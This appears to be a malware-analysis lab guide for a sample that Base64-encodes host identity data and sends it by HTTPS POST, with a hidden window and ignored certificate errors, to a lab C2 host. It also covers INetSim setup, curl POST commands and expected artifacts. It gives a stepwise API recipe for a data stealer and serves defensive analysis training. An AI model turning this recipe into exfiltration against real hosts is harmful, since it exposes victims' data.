# A04.4c HTTPS Base64 Blob Data Exfiltration

## Summary

Collects basic host identity information, serializes the collected
data as JSON, encodes the JSON as a Base64 text blob, and transmits
the encoded data to a controlled laboratory server through HTTPS POST
requests.

The sample demonstrates layered data-exfiltration behavior commonly
associated with information stealers, spyware, remote-access trojans,
lightweight implants, and malware that combines transport encryption
with application-layer encoding.

The exfiltration workflow performs the following operations:

* Retrieves the current Windows user name
* Retrieves the local computer name
* Generates a local execution timestamp
* Constructs structured JSON records
* Encodes each JSON record using Base64
* Resolves the laboratory C2 hostname
* Establishes an HTTPS connection over TCP port 443
* Sends the encoded data using HTTP POST requests
* Uses the `text/plain` content type
* Ignores selected certificate validation errors
* Creates a background worker thread
* Sends periodic host heartbeat messages
* Keeps the process active for continued transmission

Base64 encoding is implemented using the Windows Cryptography API:

```text
CryptBinaryToStringA()
```

HTTPS communication is implemented using the Windows WinINet API.

The primary transmission operation is performed using:

```text
HttpSendRequestA()
```

All network communication is directed to the controlled laboratory
hostname:

```text
c2.lab.local
```

No real external command-and-control server is contacted.

---

## Payload Summary

The payload behavior consists of collecting basic system identity
information, formatting it as JSON, encoding it as Base64, and
transmitting the resulting text blob to a laboratory HTTPS server.

### Initial Login Information Message

Immediately after execution, the sample creates a JSON record
containing:

* Current user name
* Computer name
* Execution timestamp

The JSON is Base64 encoded and sent to:

```text
https://c2.lab.local/api/v1/report
```

### Periodic Location Heartbeat Message

After the initial transmission, the sample creates a background
worker thread that sends a heartbeat once every hour.

The heartbeat contains:

* Current user name
* Computer name
* Static status value
* Current timestamp

The static status value is:

```text
location_heartbeat
```

The sample does not collect geographic coordinates. The location
message functions only as a controlled telemetry heartbeat.

No persistence, credential extraction, privilege escalation,
file encryption, or destructive functionality is performed.

---

## Network Configuration

### Destination Host

```text
c2.lab.local
```

### Destination Port

```text
443/TCP
```

### Application Protocol

```text
HTTPS
```

### HTTP Method

```text
POST
```

### Request Path

```text
/api/v1/report
```

### Content Type

```text
text/plain
```

### User-Agent

```text
DataPipelineAgent/1.2
```

### Request Security Flag

```text
INTERNET_FLAG_SECURE
```

---

## Payload Encoding Structure

The original data is first represented as compact JSON.

### Initial JSON Record

```json
{
  "username": "lab-user",
  "computer_name": "WIN11-LAB",
  "login_time": "2026-07-30 13:45:12"
}
```

The source code produces the compact equivalent:

```text
{"username":"lab-user","computer_name":"WIN11-LAB","login_time":"2026-07-30 13:45:12"}
```

The JSON is then Base64 encoded before transmission.

Example encoded body:

```text
eyJ1c2VybmFtZSI6ImxhYi11c2VyIiwiY29tcHV0ZXJfbmFtZSI6IldJTjExLUxBQiIsImxvZ2luX3RpbWUiOiIyMDI2LTA3LTMwIDEzOjQ1OjEyIn0=
```

Base64 provides data representation and obfuscation but does not
provide encryption.

In this sample, transport confidentiality is provided separately by
TLS through HTTPS.

---

## To Execute A04_4c

### Step 1 — Confirm laboratory name resolution

From the Windows analysis VM:

```powershell
Resolve-DnsName c2.lab.local
```

The hostname should resolve to the INetSim server:

```text
192.168.67.5
```

### Step 2 — Confirm the HTTPS endpoint

Test the controlled HTTPS service:

```powershell
curl.exe -k https://c2.lab.local/api/v1/report
```

The `-k` option allows curl to accept the self-signed or otherwise
untrusted laboratory certificate.

### Step 3 — Launch the HTTPS Base64 exfiltration sample

```powershell
.\A04-Credential-Theft-Spyware-Keylogger\A04_4c\bin\A04_4c_HTTPS_Base64_Exfil.exe
```

The sample does not require command-line arguments.

The console window is hidden during execution.

### Step 4 — Allow the initial HTTPS POST to complete

The first Base64 payload is transmitted immediately after the sample
retrieves the current user and computer names.

### Step 5 — Terminate the sample after artifact collection

The sample remains active to support hourly heartbeat transmission.

Terminate it manually after the required dynamic artifacts have been
captured.

For example:

```powershell
Stop-Process -Name A04_4c_HTTPS_Base64_Exfil
```

---

## Expected Initial Decoded Payload

```json
{
  "username": "lab-user",
  "computer_name": "WIN11-LAB",
  "login_time": "2026-07-30 13:45:12"
}
```

---

## Expected Heartbeat Decoded Payload

```json
{
  "username": "lab-user",
  "computer_name": "WIN11-LAB",
  "status": "location_heartbeat",
  "time": "2026-07-30 14:45:12"
}
```

---

## Expected HTTPS Request

Before TLS encryption, the logical HTTP request resembles:

```text
POST /api/v1/report HTTP/1.1
Host: c2.lab.local
User-Agent: DataPipelineAgent/1.2
Content-Type: text/plain
Content-Length: <length>

eyJ1c2VybmFtZSI6ImxhYi11c2VyIiwiY29tcHV0ZXJfbmFtZSI6IldJTjExLUxBQiIsInN0YXR1cyI6ImxvY2F0aW9uX2hlYXJ0YmVhdCIsInRpbWUiOiIyMDI2LTA3LTMwIDE0OjQ1OjEyIn0=
```

On the network, the HTTP headers and body are normally protected
inside TLS records and will not appear as cleartext in a standard
packet capture.

---

## Expected Dynamic Artifacts

### Process Activity

The sample creates:

* Main executable process
* Background worker thread

Relevant Windows API activity includes:

```text
CreateThread()
Sleep()
```

The main thread remains active using repeated 10-second sleep
intervals.

The worker thread sleeps for:

```text
3,600,000 milliseconds
```

This corresponds to one hour between heartbeat transmissions.

### DNS Activity

The sample resolves:

```text
c2.lab.local
```

Expected DNS behavior includes:

* DNS query for `c2.lab.local`
* DNS response containing `192.168.67.5`

### Network Activity

Expected network activity includes:

* Outbound TCP connection to `192.168.67.5:443`
* TLS handshake
* Server certificate exchange
* Encrypted application-data records
* Periodic HTTPS connections or requests

Because the payload is carried inside HTTPS, a normal PCAP will
generally not expose:

* The HTTP request path
* The `Content-Type` header
* The Base64 request body
* The decoded JSON fields

Those details remain visible in INetSim server-side logs and captured
POST data.

### Cryptographic and Encoding Activity

Relevant encoding behavior includes:

```text
CryptBinaryToStringA()
CRYPT_STRING_BASE64
CRYPT_STRING_NOCRLF
```

The `CRYPT_STRING_NOCRLF` flag prevents Base64 line wrapping and
produces a single continuous encoded string.

### Memory Activity

The sample dynamically allocates a buffer for the Base64 output using:

```text
malloc()
```

The allocated buffer is released after transmission using:

```text
free()
```

### Filesystem Activity

The sample does not create a local staging file.

The primary filesystem artifacts are generated on the INetSim server
when it stores the HTTPS POST body.

---


# High-Level HTTPS Base64 Exfiltration Flow

1. Start the HTTPS exfiltration executable

   ```text
   A04_4c_HTTPS_Base64_Exfil.exe
   ```

2. Hide the console window using:

   ```text
   ShowWindow(SW_HIDE)
   ```

3. Retrieve the current user name using:

   ```text
   GetUserNameA()
   ```

4. Retrieve the local computer name using:

   ```text
   GetComputerNameA()
   ```

5. Generate a local timestamp using:

   ```text
   time()
   localtime_s()
   strftime()
   ```

6. Construct a compact JSON record containing:

   * User name
   * Computer name
   * Login timestamp

7. Determine the required Base64 output-buffer size using:

   ```text
   CryptBinaryToStringA()
   ```

8. Allocate memory for the encoded output using:

   ```text
   malloc()
   ```

9. Encode the JSON record using:

   ```text
   CRYPT_STRING_BASE64
   CRYPT_STRING_NOCRLF
   ```

10. Initialize a WinINet session using:

    ```text
    InternetOpenA()
    ```

11. Configure the WinINet user-agent as:

    ```text
    DataPipelineAgent/1.2
    ```

12. Establish a connection to:

    ```text
    c2.lab.local:443
    ```

    using:

    ```text
    InternetConnectA()
    ```

13. Create an HTTPS POST request for:

    ```text
    /api/v1/report
    ```

    using:

    ```text
    HttpOpenRequestA()
    ```

14. Enable secure transport using:

    ```text
    INTERNET_FLAG_SECURE
    ```

15. Read the request security flags using:

    ```text
    InternetQueryOptionA()
    ```

16. Add certificate-validation exceptions:

    ```text
    SECURITY_FLAG_IGNORE_UNKNOWN_CA
    SECURITY_FLAG_IGNORE_CERT_CN_INVALID
    ```

17. Apply the modified security flags using:

    ```text
    InternetSetOptionA()
    ```

18. Add the request header:

    ```text
    Content-Type: text/plain
    ```

19. Transmit the Base64 text body using:

    ```text
    HttpSendRequestA()
    ```

20. Release the Base64 buffer using:

    ```text
    free()
    ```

21. Close the WinINet handles using:

    ```text
    InternetCloseHandle()
    ```

22. Create a background worker thread using:

    ```text
    CreateThread()
    ```

23. Construct a heartbeat JSON record containing:

    * User name
    * Computer name
    * `location_heartbeat` status
    * Current timestamp

24. Encode the heartbeat JSON as Base64

25. Send the encoded heartbeat over HTTPS

26. Pause the worker thread for one hour using:

    ```text
    Sleep(3600000)
    ```

27. Repeat the heartbeat transmission indefinitely

28. Keep the main thread active using repeated calls to:

    ```text
    Sleep(10000)
    ```

29. Continue execution until the process is manually terminated

---

# INetSim Laboratory Configuration

## Step 1 — Configure INetSim Services

Edit the INetSim configuration file:

```bash
sudo nano /etc/inetsim/inetsim.conf
```

Configure the service bind address:

```text
service_bind_address 192.168.67.5
```

Enable DNS and HTTPS services:

```text
start_service dns
start_service https
```

Configure the default DNS response:

```text
dns_default_ip 192.168.67.5
```

Add a static DNS record for the controlled C2 hostname:

```text
dns_static c2.lab.local 192.168.67.5
```

The HTTPS service must be enabled because the sample connects to:

```text
TCP port 443
```

Enabling only the HTTP service would normally configure port 80 and
would not satisfy the sample's HTTPS connection.

---

## Step 2 — Configure the HTTPS Response

Create the static JSON response file:

```bash
sudo nano /var/lib/inetsim/http/fakefiles/report_OK.json
```

Add the following response body:

```json
{
  "status": "ok",
  "task": "telemetry accepted"
}
```

Map the API path to the response:

```text
https_static_fakefile /api/v1/report report_OK.json application/json
```

Depending on the installed INetSim version and configuration layout,
HTTPS may share HTTP fakefile settings. Confirm the supported
directive in the active INetSim configuration file before restarting
the service.

Restart INetSim after applying the configuration:

```bash
sudo systemctl restart inetsim
```

Alternatively, when running INetSim manually:

```bash
sudo inetsim
```

---

## Step 3 — Test the HTTPS Endpoint

From the Windows analysis VM, test the HTTPS response:

```powershell
curl.exe -k https://c2.lab.local/api/v1/report
```

Expected response:

```json
{
  "status": "ok",
  "task": "telemetry accepted"
}
```

The test URL must use:

```text
https://
```

rather than:

```text
http://
```

because the sample uses port 443 and `INTERNET_FLAG_SECURE`.

---

## Step 4 — Generate a Test Base64 Payload

From PowerShell, create a test JSON record:

```powershell
$json = '{"username":"tester","computer_name":"WINLAB","status":"manual_test"}'
```

Encode it as Base64:

```powershell
$encoded = [Convert]::ToBase64String(
    [Text.Encoding]::UTF8.GetBytes($json)
)
```

Display the encoded value:

```powershell
$encoded
```

---

## Step 5 — Test an HTTPS POST Request

Send the encoded body to the controlled endpoint:

```powershell
curl.exe -k -X POST https://c2.lab.local/api/v1/report `
  -H "Content-Type: text/plain" `
  -d $encoded
```

A fixed sample body may also be used:

```powershell
curl.exe -k -X POST https://c2.lab.local/api/v1/report `
  -H "Content-Type: text/plain" `
  -d "eyJ1c2VybmFtZSI6InRlc3RlciIsImNvbXB1dGVyX25hbWUiOiJXSU5MQUIiLCJzdGF0dXMiOiJtYW51YWxfdGVzdCJ9"
```

---

## Step 6 — Monitor INetSim Activity

Monitor the INetSim service log:

```bash
sudo tail -f /var/log/inetsim/service.log
```

Expected entries should indicate:

* DNS resolution for `c2.lab.local`
* HTTPS connection from the Windows analysis VM
* TLS negotiation
* POST request to `/api/v1/report`
* Captured request data

---

## Step 7 — View Captured POST Data

Display captured request bodies:

```bash
sudo cat /var/lib/inetsim/http/postdata/*
```

Depending on the INetSim version, HTTPS POST data may still be stored
under the shared HTTP post-data directory:

```text
/var/lib/inetsim/http/postdata/
```

The captured body should resemble:

```text
eyJ1c2VybmFtZSI6Im1pc2hhLmt1cnR6IiwiY29tcHV0ZXJfbmFtZSI6IldJTl9WTSIsInN0YXR1cyI6ImxvY2F0aW9uX2hlYXJ0YmVhdCIsInRpbWUiOiIyMDI2LTA2LTE2IDEyOjA0OjMzIn0=
```

---

## Step 8 — Decode Captured POST Data

Decode a captured Base64 body using:

```bash
echo "eyJ1c2VybmFtZSI6Im1pc2hhLmt1cnR6IiwiY29tcHV0ZXJfbmFtZSI6IldJTl9WTSIsInN0YXR1cyI6ImxvY2F0aW9uX2hlYXJ0YmVhdCIsInRpbWUiOiIyMDI2LTA2LTE2IDEyOjA0OjMzIn0=" | base64 -d
```

Expected decoded output:

```json
{
  "username": "misha.kurtz",
  "computer_name": "WIN_VM",
  "status": "location_heartbeat",
  "time": "2026-06-16 12:04:33"
}
```

The actual decoded JSON produced by the sample is compact and appears
on a single line:

```text
{"username":"misha.kurtz","computer_name":"WIN_VM","status":"location_heartbeat","time":"2026-06-16 12:04:33"}
```

---

## Step 9 — Delete Previous POST Data

Before beginning a new controlled execution, remove old captured POST
data:

```bash
sudo find /var/lib/inetsim/http/postdata -type f -delete
```

This prevents request bodies from previous executions from being
mixed with the current analysis run.

---


# Expected INetSim and PCAP Evidence

## INetSim Service Log

The INetSim log should record:

```text
DNS request for c2.lab.local
HTTPS connection to port 443
POST request for /api/v1/report
```

## Captured POST Data

INetSim should create one or more files containing the transmitted
Base64 request bodies.

After decoding, each body should contain the original JSON telemetry.

## Packet Capture

A corresponding packet capture should show:

1. DNS query for:

   ```text
   c2.lab.local
   ```

2. DNS response containing:

   ```text
   192.168.67.5
   ```

3. TCP three-way handshake with:

   ```text
   192.168.67.5:443
   ```

4. TLS ClientHello

5. TLS ServerHello

6. Server certificate transmission

7. Encrypted TLS application-data records

8. Connection closure after request completion

Without TLS session keys or server-side visibility, the packet capture
will not normally reveal the Base64 body or decoded JSON content.


---

## Behavioral Distinction from A04_4a and A04_4b

### A04_4a

```text
JSON → cleartext HTTP POST → port 80
```

Content type:

```text
application/json
```

### A04_4b

```text
form fields → cleartext HTTP POST → port 80
```

Content type:

```text
application/x-www-form-urlencoded
```

### A04_4c

```text
JSON → Base64 encoding → HTTPS POST → port 443
```

Content type:

```text
text/plain
```

A04_4c therefore introduces two additional analytical layers:

* Application-layer Base64 encoding
* TLS-protected network transport

This produces distinct static artifacts in the binary and encrypted
packet-level behavior in the PCAP while preserving the same broader
host-data exfiltration objective.
